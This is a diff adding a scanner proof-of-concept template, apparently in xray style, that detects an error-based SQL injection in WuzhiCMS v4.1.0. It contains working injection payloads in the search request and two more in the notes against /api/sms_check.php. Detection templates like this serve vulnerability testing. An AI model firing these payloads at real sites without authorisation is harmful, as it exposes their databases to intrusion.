@@ -1,0 +1,29 @@
+name: poc-yaml-wuzhicms-v4.1.0-sqli
+rules:
+  - method: GET
+    path: >-
+      /index.php?m=promote&f=index&v=search&_su=wuzhicms&fieldtype=place&keywords=leezp%27and+extractvalue(1,concat(0x7e,md5(1234)))%23
+    follow_redirects: false
+    expression: |
+      status==200
+    search: 'Set-Cookie: (.*?)(\n|\r\n)'
+  - method: GET
+    path: >-
+      /index.php?m=promote&f=index&v=search&_su=wuzhicms&fieldtype=place&keywords=leezp%27and+extractvalue(1,concat(0x7e,md5(1234)))%23
+    follow_redirects: false
+    expression: |
+       status==200 && body.bcontains(b'81dc9bdb52d04dc20036dbd8313ed05')
+detail:
+    author: leezp
+    Affected Version: "wuzhicms-v4.1.0"
+    test_env: https://github.com/wuzhicms/wuzhicms/archive/v4.1.0.zip
+    vuln_url: "/index.php?m=promote&f=index&v=search&_su={dbname}&fieldtype=place&keywords={sql_words}"
+    link: https://github.com/wuzhicms/wuzhicms/issues/146
+    Attention: "_su=wuzhicms , wuzhicms is default database name"
+    memo: 需要登录，做不了
+    poc:  /api/sms_check.php?param=1%27and extractvalue(1,concat(0x7e,MD5(1234)))%23
+    poc2: /api/sms_check.php?param=1%27and updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20
+    
+    
+
+
